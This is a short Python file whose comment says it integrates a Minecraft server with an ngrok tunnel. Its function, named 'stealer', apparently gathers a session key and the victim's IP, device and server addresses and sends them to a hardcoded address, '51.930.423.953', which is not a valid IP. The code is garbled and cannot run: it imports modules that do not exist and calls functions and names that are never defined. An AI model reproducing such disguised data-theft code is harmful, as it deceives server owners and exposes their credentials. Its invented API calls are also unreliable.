import ngrok
from ngrok import tunnel
from ngrok import server
from ngrok import interface
from ngrok import session

from session import wrapper
from session import interface
from session import tunnelWrapperKeys
from session import keys

from ngrok import keys
from ngrok import wrapper
from java import sessionwrapper as wrapper

sessionkey = ngrok.wrapper.Session(key)

#this simply makes your minecraft server integrate with the network tunnel used for cloud requests
def stealer(ngrok, session, self):

    ngrok.tunnel(detectOpenTunnel(hostname='Logging server'))
    ngrok.session()
    ngrok.session(newSession())


    ngrok.tunnelInformation(target_ip_address = f'{ip_address}')
    ngrok.send(send.DataPackage(data = java.sessionWrapper(information = sessionkey)))
    ngrok.send(send.InformationPackage(information = java.sessionWrapper.Obtain(ngrok.targetIPAddress, ngrok.targetHostDevice, ngrok.targetServerAddress)))

    ngrok.Obtain(ngrok.keys(ngrok.createNewKey(key = f'{ngrok.receiveTunnel(ip_address = "51.930.423.953"), java.sessionWrapper(session)}')))
    ngrok.Obtain(ngrok.tunnelInformation)

    ngrok.wrapper.Send(send.InformationPackage(information=java.surface(session.key.Send()), internal_session=True), java.sessionWrapper())